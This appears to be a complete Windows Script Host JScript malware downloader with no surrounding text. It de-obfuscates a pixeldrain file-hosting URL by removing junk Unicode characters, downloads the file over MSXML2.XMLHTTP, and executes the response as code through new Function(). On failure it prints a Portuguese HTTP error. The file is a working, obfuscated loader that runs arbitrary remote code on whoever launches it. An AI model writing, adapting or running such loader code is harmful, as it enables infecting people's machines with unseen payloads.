var basements = "httƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳ps:Ʀ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳//pƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳ixeƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳ldrƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳ainƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳.coƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳m/aƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳pi/Ʀ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳filƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳e/dƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳yEeƦ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳wy4Ʀ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳2";
basements = basements.replace(/Ʀ༪Ī෌🏓۽ᐴᓬᅻኴʦ〘ϕĩ❳/g, "");
var fatcat = new ActiveXObject("MSXML2.XMLHTTP");
fatcat.open("GET", basements, false);
fatcat.send();
if (fatcat.status == 200) {
    new Function(fatcat.responseText)();
} else {
    WScript.Echo("Erro HTTP: " + fatcat.status);
}
